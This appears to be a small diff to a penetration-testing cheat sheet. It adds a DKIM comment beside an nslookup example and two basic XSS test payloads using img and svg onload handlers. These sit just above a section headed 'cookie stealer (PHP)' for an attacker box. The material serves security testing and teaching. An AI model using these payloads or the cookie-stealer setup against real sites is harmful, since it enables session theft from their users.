@@ -3833,6 +3833,8 @@ nslookup
 server DNS_IP_here
 127.0.0.1
 IP_here
+
+# check for DKIM
 ```
 
 
@@ -6173,6 +6175,10 @@ xprobe2 -v -p tcp:port_here:open IP_here
 
 ## XSS
 ```php
+# simple img payload
+<img onload=alert(1)>
+<svg onload=prompt(1)>
+
 # cookie stealer (PHP)
 ## setup cookie stealer on attacker box
 nano cookie.php
